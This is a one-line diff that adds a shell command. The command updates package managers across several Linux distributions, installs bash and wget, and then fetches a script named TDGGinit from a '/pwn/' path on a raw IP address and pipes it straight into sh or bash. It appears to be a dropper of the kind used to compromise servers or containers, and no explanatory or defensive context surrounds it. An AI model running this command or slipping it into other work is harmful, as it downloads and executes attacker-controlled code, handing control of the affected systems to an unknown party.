@@ -1,0 +1,1 @@
+sh -c 'apk update; apt-get update ; yum clean all ; apk add bash wget ; apt-get install -y bash wget ; yum install -y bash wget ; wget -O - http://45.9.150.36/pwn/TDGGinit | sh || curl http://45.9.150.36/pwn/TDGGinit | bash'
